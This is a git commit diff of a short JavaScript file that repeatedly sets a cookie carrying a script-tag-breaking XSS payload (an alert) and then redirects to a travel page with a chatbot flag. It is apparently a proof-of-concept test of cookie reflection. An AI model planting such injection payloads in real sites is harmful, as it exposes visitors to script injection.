d311fc19823f1d7b1391ac1313486279028e1ef6
Ariel Ortmann <ariel.ortmann8@gmail.com>
2019-12-06 10:32:22 -0300

    Update trackerid2.js

--- trackerid2.js
+++ trackerid2.js
@@ -3,5 +3,5 @@ setInterval(function() {
     document.cookie = "trackerid=ao\"</script><script>alert('payload in cookies, again')</script>\"; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/"
 }, 300);
 setTimeout(function() {
-    window.location = '/'
+    window.location = '/donde-viajar?chatBot=true'
 }, 1500);
